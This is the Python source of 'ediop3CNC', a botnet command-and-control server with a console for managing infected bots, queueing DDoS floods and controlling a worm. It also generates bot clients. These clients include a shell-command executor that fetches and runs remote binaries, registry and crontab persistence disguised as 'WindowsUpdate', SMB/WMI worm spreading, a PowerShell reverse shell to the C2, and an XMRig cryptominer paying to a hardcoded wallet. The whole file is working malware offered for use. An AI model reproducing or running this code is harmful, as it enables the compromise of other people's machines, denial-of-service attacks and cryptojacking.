#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
███████╗██████╗ ██╗ ██████╗ ██████╗ ██████╗ 
██╔════╝██╔══██╗██║██╔═══██╗██╔══██╗██╔══██╗
█████╗  ██║  ██║██║██║   ██║██████╔╝██████╔╝
██╔══╝  ██║  ██║██║██║   ██║██╔═══╝ ██╔═══╝ 
███████╗██████╔╝██║╚██████╔╝██║     ██║     
╚══════╝╚═════╝ ╚═╝ ╚═════╝ ╚═╝     ╚═╝     
"""
import os
import sys
import socket
import threading
import time
import random
import subprocess
import platform
import json
import base64
from Crypto.Cipher import AES
from Crypto import Random
import requests
import paramiko
import scapy.all as scapy
import dns.resolver

# Configuration
VERSION = "3.0"
MODULES_DIR = "~/ediop3CNC/modules"
DATABASE_FILE = "bots.db"
CNC_IP = "0.0.0.0"
CNC_PORT = 443
AES_KEY = b'Sixteen byte key'

# Globals
attacks = {}
current_selected = 0
worm_active = False
worm_targets = []

class BotDatabase:
    def __init__(self, db_file=DATABASE_FILE, key=AES_KEY):
        self.db_file = db_file
        self.key = key
        self.encryption = AESEncryption(key)
        self.bots = {}
        self.load()
        
    def pad(self, s):
        return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)

    def unpad(self, s):
        return s[:-ord(s[len(s)-1:])]
    
    def load(self):
        """Load bots from encrypted database"""
        try:
            if os.path.exists(self.db_file):
                with open(self.db_file, 'rb') as f:
                    encrypted_data = f.read()
                    if encrypted_data:
                        decrypted = self.encryption.decrypt(encrypted_data)
                        self.bots = json.loads(decrypted)
                        print(f"[+] Loaded {len(self.bots)} bots from database")
        except Exception as e:
            print(f"[!] Database load error: {str(e)}")
            self.bots = {}
    
    def save(self):
        """Save bots to encrypted database"""
        try:
            data = json.dumps(self.bots)
            encrypted = self.encryption.encrypt(data)
            with open(self.db_file, 'wb') as f:
                f.write(encrypted)
        except Exception as e:
            print(f"[!] Database save error: {str(e)}")
    
    def add_bot(self, bot_id, bot_data):
        """Add or update a bot"""
        self.bots[bot_id] = bot_data
        self.save()
    
    def remove_bot(self, bot_id):
        """Remove a bot"""
        if bot_id in self.bots:
            del self.bots[bot_id]
            self.save()
            return True
        return False
    
    def get_bot(self, bot_id):
        """Get a single bot"""
        return self.bots.get(bot_id)
    
    def get_all_bots(self):
        """Get all bots"""
        return self.bots
    
    def clear(self):
        """Clear all bots"""
        self.bots = {}
        self.save()

class AESEncryption:
    def __init__(self, key):
        self.key = key
    
    def encrypt(self, raw):
        """Encrypt raw data"""
        raw = self.pad(raw)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return iv + cipher.encrypt(raw.encode())
    
    def decrypt(self, enc):
        """Decrypt encrypted data"""
        iv = enc[:AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self.unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')
    
    def pad(self, s):
        return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)
    
    def unpad(self, s):
        return s[:-ord(s[len(s)-1:])]

class Bot:
    def __init__(self, id, ip, os, status):
        self.id = id
        self.ip = ip
        self.os = os
        self.status = status
        self.last_seen = time.time()
        self.commands = []
        self.responses = []
        self.features = []

class CNCShell:
    def __init__(self):
        self.encryption = AESEncryption(AES_KEY)
        self.db = BotDatabase()
        self.running = True
        self.load_modules()
        
    def load_modules(self):
        """Load attack modules from modules directory"""
        try:
            modules_path = os.path.expanduser(MODULES_DIR)
            if not os.path.exists(modules_path):
                os.makedirs(modules_path)
                
            for filename in os.listdir(modules_path):
                if filename.endswith('.py'):
                    module_name = filename[:-3]
                    try:
                        module = __import__(f"modules.{module_name}", fromlist=[''])
                        attacks[module_name] = module
                    except Exception as e:
                        print(f"[!] Failed to load module {module_name}: {str(e)}")
        except Exception as e:
            print(f"[!] Module loading error: {str(e)}")

    def show_help(self):
        """Display help message with all commands"""
        help_text = f"""
🔥 ediop3CNC Help - Version {VERSION} 🔥

🌐 Bot Management:
  show bots               - Show all connected bots
  select [id|range]       - Select bots to control (0=all)
  cmd [ID] [COMMAND]      - Execute command on selected bots
  update [URL] --force    - Push new binaries to bots
  keep [id]               - Keep bot alive even if shutdown

⚔️ Attack Modules:
  attack ddos syn [IP] [PORT] --spoof     - SYN flood attack
  attack ddos udp [IP] [PORT] --amp=500   - Amplified UDP flood
  attack http [URL] --threads=1000        - HTTP flood
  attack slowloris [IP] --sockets=5000    - Slowloris attack
  attack memcached [IP] --reflector=1.1.1.1 - Memcached amplification
  attack ntp [IP] --monlist               - NTP amplification
  attack ssdp [IP] --payload=malware.bin  - SSDP reflection
  attack dns [DOMAIN] --qps=50000         - DNS flood
  attack tcp [IP] [PORT] --flags=all      - TCP flag flood
  attack layer7 [URL] --vectors=all       - Multi-vector L7 attack

🧫 Botnet Generation:
  gen py [output.py] --ddos --worm       - Python botnet
  gen exe [output.exe] --persist --spread - Windows executable
  gen bat [output.bat] --miner --scanner  - Batch script botnet

🦠 Worm Control:
  worm scan               - Network discovery
  worm spread --os=all    - Spread via all vectors
  worm payload set [URL]  - Set custom payload
  worm status             - Show propagation status

🛑 Other:
  exit                    - Exit the C&C
  help                    - Show this help
"""
        print(help_text)

    def show_bots(self):
        """Display connected bots"""
        bots = self.db.get_all_bots()
        print(f"\n[BOT LIST - {len(bots)} ONLINE]")
        print("ID\tIP\t\tOS\tSTATUS")
        print("-"*50)
        for id, bot in bots.items():
            print(f"{id}\t{bot['ip']}\t{bot['os']}\t{bot['status']}")
        print()

    def select_bots(self, args):
        """Select bots to control"""
        global current_selected
        if not args:
            print("[!] Specify bot ID or range")
            return
            
        selection = args[0]
        if selection == "0":
            current_selected = 0
            print("[+] Selected ALL bots")
        elif "-" in selection:
            start, end = map(int, selection.split("-"))
            current_selected = list(range(start, end+1))
            print(f"[+] Selected bots {start} to {end}")
        else:
            current_selected = [int(selection)]
            print(f"[+] Selected bot {selection}")

    def send_command(self, args):
        """Send command to selected bots"""
        if not args:
            print("[!] Specify command")
            return
            
        if current_selected == 0:
            targets = list(self.db.get_all_bots().keys())
        else:
            targets = current_selected
            
        cmd = " ".join(args)
        for bot_id in targets:
            bot = self.db.get_bot(str(bot_id))
            if bot:
                bot['commands'].append(cmd)
                self.db.add_bot(str(bot_id), bot)
                print(f"[+] Command queued for bot {bot_id}")

    def update_bots(self, args):
        """Update bot binaries"""
        if not args:
            print("[!] Specify update URL")
            return
            
        url = args[0]
        force = "--force" in args
        
        if current_selected == 0:
            targets = list(self.db.get_all_bots().keys())
        else:
            targets = current_selected
            
        for bot_id in targets:
            bot = self.db.get_bot(str(bot_id))
            if bot:
                bot['commands'].append(f"update {url} {'--force' if force else ''}")
                self.db.add_bot(str(bot_id), bot)
                print(f"[+] Update queued for bot {bot_id}")

    def keep_alive(self, args):
        """Keep bots alive even if shutdown"""
        if not args:
            print("[!] Specify bot ID")
            return
            
        bot_id = args[0]
        bot = self.db.get_bot(str(bot_id))
        if bot:
            bot['commands'].append("keep_alive")
            self.db.add_bot(str(bot_id), bot)
            print(f"[+] Keep-alive activated for bot {bot_id}")

    def generate_botnet(self, args):
        """Generate botnet clients"""
        if len(args) < 2:
            print("[!] Usage: gen [type] [output] [options]")
            return
            
        gen_type = args[0]
        output_file = args[1]
        
        if gen_type == "py":
            self.generate_python_botnet(output_file, args[2:])
        elif gen_type == "exe":
            self.generate_exe_botnet(output_file, args[2:])
        elif gen_type == "bat":
            self.generate_batch_botnet(output_file, args[2:])
        else:
            print("[!] Unknown generator type")

    def generate_python_botnet(self, output_file, options):
        """Generate Python botnet client"""
        try:
            ddos = "--ddos" in options
            worm = "--worm" in options
            
            template = f"""#!/usr/bin/env python3
import os, sys, socket, threading, time, random, subprocess, platform, json, base64
from Crypto.Cipher import AES
from Crypto import Random

CNC_IP = "{CNC_IP}"
CNC_PORT = {CNC_PORT}
AES_KEY = b'Sixteen byte key'

class BotClient:
    def __init__(self):
        self.id = None
        self.ip = self.get_ip()
        self.os = platform.system()
        self.status = "Active"
        self.features = []
        {"self.features.append('ddos')" if ddos else ""}
        {"self.features.append('worm')" if worm else ""}
        
    def get_ip(self):
        try:
            return socket.gethostbyname(socket.gethostname())
        except:
            return "127.0.0.1"
            
    def connect_to_cnc(self):
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((CNC_IP, CNC_PORT))
                self.send_data(s, "register", {{"ip": self.ip, "os": self.os, "status": self.status, "features": self.features}})
                
                while True:
                    cmd = self.recv_data(s)
                    if not cmd:
                        break
                        
                    if cmd == "ping":
                        self.send_data(s, "pong", {{}})
                    else:
                        output = self.execute_command(cmd)
                        self.send_data(s, "cmd_output", {{"output": output}})
                        
            except Exception as e:
                time.sleep(60)
                
    def execute_command(self, cmd):
        try:
            if cmd.startswith("update"):
                return self.handle_update(cmd)
            elif cmd == "keep_alive":
                return self.set_persistence()
            else:
                return subprocess.check_output(cmd, shell=True).decode()
        except Exception as e:
            return str(e)
            
    def handle_update(self, cmd):
        parts = cmd.split()
        if len(parts) < 2:
            return "Invalid update command"
            
        url = parts[1]
        force = "--force" in parts
        
        try:
            import requests
            r = requests.get(url, stream=True)
            with open("update.bin", "wb") as f:
                for chunk in r.iter_content(1024):
                    f.write(chunk)
                    
            if platform.system() == "Windows":
                subprocess.run("update.bin", shell=True)
            else:
                os.chmod("update.bin", 0o755)
                subprocess.run("./update.bin", shell=True)
            return "Update successful"
        except Exception as e:
            return f"Update failed: {str(e)}"
            
    def set_persistence(self):
        if platform.system() == "Windows":
            # Windows persistence via registry
            import winreg
            key = winreg.HKEY_CURRENT_USER
            key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            try:
                reg_key = winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE)
                winreg.SetValueEx(reg_key, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable)
                winreg.CloseKey(reg_key)
                return "Windows persistence set"
            except Exception as e:
                return f"Windows persistence failed: {str(e)}"
        else:
            # Linux persistence via crontab
            try:
                cron_line = f"@reboot {sys.executable} {os.path.abspath(__file__)}"
                with open("/tmp/cronjob", "w") as f:
                    f.write(f"{cron_line}\\n")
                subprocess.run("crontab /tmp/cronjob", shell=True)
                return "Linux persistence set"
            except Exception as e:
                return f"Linux persistence failed: {str(e)}"
                
    def encrypt(self, raw):
        raw = self.pad(raw)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
        return base64.b64encode(iv + cipher.encrypt(raw.encode()))
    
    def decrypt(self, enc):
        enc = base64.b64decode(enc)
        iv = enc[:AES.block_size]
        cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
        return self.unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')
        
    def pad(self, s):
        return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)
    
    def unpad(self, s):
        return s[:-ord(s[len(s)-1:])]
    
    def send_data(self, sock, cmd, data):
        payload = json.dumps({{"cmd": cmd, "data": data}})
        encrypted = self.encrypt(payload)
        sock.sendall(encrypted + b"\\n")
        
    def recv_data(self, sock):
        data = sock.recv(4096)
        if not data:
            return None
        return self.decrypt(data).strip()

if __name__ == "__main__":
    bot = BotClient()
    bot.connect_to_cnc()
"""

            with open(output_file, "w") as f:
                f.write(template)
            
            os.chmod(output_file, 0o755)
            print(f"[+] Python botnet generated: {output_file}")
            
            # Add pyinstaller conversion if requested
            if "--exe" in options:
                try:
                    subprocess.run(f"pyinstaller --onefile --noconsole {output_file}", shell=True)
                    print(f"[+] EXE version created in dist/ directory")
                except Exception as e:
                    print(f"[!] PyInstaller conversion failed: {str(e)}")

        except Exception as e:
            print(f"[!] Error generating Python botnet: {str(e)}")

    def generate_exe_botnet(self, output_file, options):
        """Generate Windows EXE botnet client"""
        try:
            persist = "--persist" in options
            spread = "--spread" in options
            
            # First create Python version
            temp_py = "temp_botnet.py"
            self.generate_python_botnet(temp_py, [opt for opt in options if opt not in ["--persist", "--spread"]] + ["--exe"])                
            # Add EXE-specific features
            with open(temp_py, "a") as f:
                if persist:
                    f.write("""
# Windows persistence via registry
def set_persistence():
    import winreg
    key = winreg.HKEY_CURRENT_USER
    key_path = r"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run"
    try:
        reg_key = winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(reg_key, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable)
        winreg.CloseKey(reg_key)
    except Exception as e:
        pass
set_persistence()
""")
                
                if spread:
                    f.write("""
# Worm spreading functionality
def spread_via_smb():
    import nmap
    scanner = nmap.PortScanner()
    scanner.scan(hosts='192.168.1.0/24', arguments='-p 445 --open')
    for host in scanner.all_hosts():
        if scanner[host]['tcp'][445]['state'] == 'open':
            try:
                # Try to copy via SMB
                os.system(f'copy {sys.argv[0]} \\\\\\\\{host}\\\\C$\\\\Windows\\\\Temp\\\\')
                # Execute remotely via WMI
                os.system(f'wmic /node:{host} process call create "C:\\\\\\\\Windows\\\\\\\\Temp\\\\\\\\{os.path.basename(sys.argv[0])}"')
            except:
                pass

# Run spreading in separate thread
spread_thread = threading.Thread(target=spread_via_smb)
spread_thread.daemon = True
spread_thread.start()
""")
            
            # Convert to EXE
            try:
                subprocess.run(f"pyinstaller --onefile --noconsole {temp_py}", shell=True)
                os.rename("dist/temp_botnet.exe", output_file)
                print(f"[+] EXE botnet generated: {output_file}")
            except Exception as e:
                print(f"[!] EXE generation failed: {str(e)}")
            
            # Cleanup
            os.remove(temp_py)
            
        except Exception as e:
            print(f"[!] Error generating EXE botnet: {str(e)}")

    def generate_batch_botnet(self, output_file, options):
        """Generate batch script botnet"""
        try:
            miner = "--miner" in options
            scanner = "--scanner" in options
            
            template = f"""@echo off
:: Batch Botnet Client
set CNC_IP={CNC_IP}
set CNC_PORT={CNC_PORT}

:connect
for /f "tokens=2 delims=:" %%A in ('ipconfig ^| findstr "IPv4"') do set IP=%%A
set IP=%IP:~1%
set OS=%PROCESSOR_ARCHITECTURE%

powershell -command "$client = New-Object System.Net.Sockets.TcpClient('{CNC_IP}', {CNC_PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
if %errorlevel% equ 0 (
    goto connect
) else (
    timeout /t 60 >nul
    goto connect
)
"""
            if miner:
                template += """
:: Cryptocurrency miner
:miner
curl -o xmrig.exe https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-msvc-win64.zip
unzip xmrig-6.18.0-msvc-win64.zip
xmrig.exe -o pool.minexmr.com:4444 -u 48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLwEVsaSWJ4fhdUyZijBGUicoD -p x
goto miner
"""
            
            if scanner:
                template += """
:: Network scanner
:scan
for /l %%i in (1,1,254) do (
    ping -n 1 192.168.1.%%i | find "TTL=" >nul && (
        echo 192.168.1.%%i is online
        copy %0 \\\\192.168.1.%%i\\C$\\Windows\\Temp\\
    )
)
timeout /t 3600 >nul
goto scan
"""
            
            with open(output_file, "w") as f:
                f.write(template)
            
            print(f"[+] Batch botnet generated: {output_file}")
            
        except Exception as e:
            print(f"[!] Error generating batch botnet: {str(e)}")

    def launch_attack(self, args):
        """Launch attack using loaded modules"""
        if len(args) < 1:
            print("[!] Specify attack type")
            return
            
        attack_type = args[0]
        if attack_type not in attacks:
            print(f"[!] Unknown attack type: {attack_type}")
            return
            
        try:
            module = attacks[attack_type]
            if current_selected == 0:
                targets = list(self.db.get_all_bots().keys())
            else:
                targets = current_selected
                
            for bot_id in targets:
                bot = self.db.get_bot(str(bot_id))
                if bot:
                    bot['commands'].append(f"attack {' '.join(args)}")
                    self.db.add_bot(str(bot_id), bot)
                    print(f"[+] Attack command queued for bot {bot_id}")
        except Exception as e:
            print(f"[!] Attack failed: {str(e)}")

    def worm_control(self, args):
        """Control worm propagation"""
        global worm_active, worm_targets
        
        if len(args) < 1:
            print("[!] Specify worm command")
            return
            
        cmd = args[0]
        
        if cmd == "scan":
            if current_selected == 0:
                targets = list(self.db.get_all_bots().keys())
            else:
                targets = current_selected
                
            for bot_id in targets:
                bot = self.db.get_bot(str(bot_id))
                if bot:
                    bot['commands'].append("worm scan")
                    self.db.add_bot(str(bot_id), bot)
                    print(f"[+] Worm scan queued for bot {bot_id}")
            
        elif cmd == "spread":
            os_filter = None
            if "--os" in args:
                idx = args.index("--os")
                if idx+1 < len(args):
                    os_filter = args[idx+1]
            
            if current_selected == 0:
                targets = list(self.db.get_all_bots().keys())
            else:
                targets = current_selected
                
            for bot_id in targets:
                bot = self.db.get_bot(str(bot_id))
                if bot:
                    cmd = f"worm spread --os={os_filter}" if os_filter else "worm spread"
                    bot['commands'].append(cmd)
                    self.db.add_bot(str(bot_id), bot)
                    print(f"[+] Worm spread queued for bot {bot_id}")
            worm_active = True
            
        elif cmd == "payload":
            if len(args) < 3 or args[1] != "set":
                print("[!] Usage: worm payload set [URL]")
                return
                
            payload_url = args[2]
            if current_selected == 0:
                targets = list(self.db.get_all_bots().keys())
            else:
                targets = current_selected
                
            for bot_id in targets:
                bot = self.db.get_bot(str(bot_id))
                if bot:
                    bot['commands'].append(f"worm payload set {payload_url}")
                    self.db.add_bot(str(bot_id), bot)
                    print(f"[+] Worm payload update queued for bot {bot_id}")
            
        elif cmd == "status":
            print(f"\n[WORM STATUS - {'ACTIVE' if worm_active else 'INACTIVE'}]\n")
            print(f"Infected Targets: {len(worm_targets)}")
            for target in worm_targets:
                print(f"- {target['ip']} ({target['os']}) via {target['vector']}")
            print()
            
        else:
            print("[!] Unknown worm command")

    def handle_command(self, cmd):
        """Process user commands"""
        try:
            parts = cmd.split()
            if not parts:
                return
            
            if parts[0] == "help":
                self.show_help()
            elif parts[0] == "show":
                self.show_bots()
            elif parts[0] == "select":
                self.select_bots(parts[1:])
            elif parts[0] == "cmd":
                self.send_command(parts[1:])
            elif parts[0] == "update":
                self.update_bots(parts[1:])
            elif parts[0] == "keep":
                self.keep_alive(parts[1:])
            elif parts[0] == "gen":
                self.generate_botnet(parts[1:])
            elif parts[0] == "attack":
                self.launch_attack(parts[1:])
            elif parts[0] == "worm":
                self.worm_control(parts[1:])
            elif parts[0] == "exit":
                self.running = False
            else:
                print(f"[!] Unknown command: {cmd}")
        except Exception as e:
            print(f"[!] Command error: {str(e)}")

def main():
    print(f"""
███████╗██████╗ ██╗ ██████╗ ██████╗ ██████╗ 
██╔════╝██╔══██╗██║██╔═══██╗██╔══██╗██╔══██╗
█████╗  ██║  ██║██║██║   ██║██████╔╝██████╔╝
██╔══╝  ██║  ██║██║██║   ██║██╔═══╝ ██╔═══╝ 
███████╗██████╔╝██║╚██████╔╝██║     ██║     
╚══════╝╚═════╝ ╚═╝ ╚═════╝ ╚═╝     ╚═╝     
            
ediop3CNC v{VERSION} - Zeta Realm Controller
Type 'help' for commands
""")
    
    shell = CNCShell()
    
    # Start listener thread
    listener = threading.Thread(target=start_listener, args=(shell,))
    listener.daemon = True
    listener.start()
    
    # Main command loop
    while shell.running:
        try:
            cmd = input("zeta> ")
            shell.handle_command(cmd)
        except KeyboardInterrupt:
            print("\n[!] Use 'exit' command to quit")
        except Exception as e:
            print(f"[!] Error: {str(e)}")
    
    print("[+] Shutting down ediop3CNC...")

def start_listener(shell):
    """Start C&C listener server"""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((CNC_IP, CNC_PORT))
        s.listen(5)
        
        print(f"[+] C&C listener started on {CNC_IP}:{CNC_PORT}")
        
        while shell.running:
            try:
                conn, addr = s.accept()
                client_thread = threading.Thread(target=handle_client, args=(conn, addr, shell))
                client_thread.daemon = True
                client_thread.start()
            except:
                pass

def handle_client(conn, addr, shell):
    """Handle incoming bot connections"""
    try:
        data = conn.recv(4096)
        if not data:
            return
            
        decrypted = shell.encryption.decrypt(data)
        message = json.loads(decrypted)
        
        if message["cmd"] == "register":
            bot_id = str(len(shell.db.get_all_bots()) + 1)
            bot_data = {
                "ip": message["data"]["ip"],
                "os": message["data"]["os"],
                "status": "Active",
                "features": message["data"].get("features", []),
                "commands": [],
                "responses": [],
                "last_seen": time.time()
            }
            shell.db.add_bot(bot_id, bot_data)
            print(f"[+] New bot connected: {bot_id} ({bot_data['ip']})")
            
            # Send any queued commands
            if bot_data['commands']:
                response = {"cmd": "execute", "data": {"commands": bot_data['commands']}}
                encrypted = shell.encryption.encrypt(json.dumps(response))
                conn.sendall(encrypted)
                bot_data['commands'] = []
                shell.db.add_bot(bot_id, bot_data)
            
        elif message["cmd"] == "cmd_output":
            bot_id = message["data"].get("id")
            if bot_id:
                bot = shell.db.get_bot(bot_id)
                if bot:
                    bot['responses'].append(message["data"]["output"])
                    shell.db.add_bot(bot_id, bot)
                    print(f"[Bot-{bot_id}] Command output: {message['data']['output']}")
                
        elif message["cmd"] == "worm_report":
            worm_targets.append(message["data"])
            print(f"[Worm] New infection: {message['data']['ip']} via {message['data']['vector']}")
            
    except Exception as e:
        print(f"[!] Client handler error: {str(e)}")
    finally:
        conn.close()

if __name__ == "__main__":
    main()
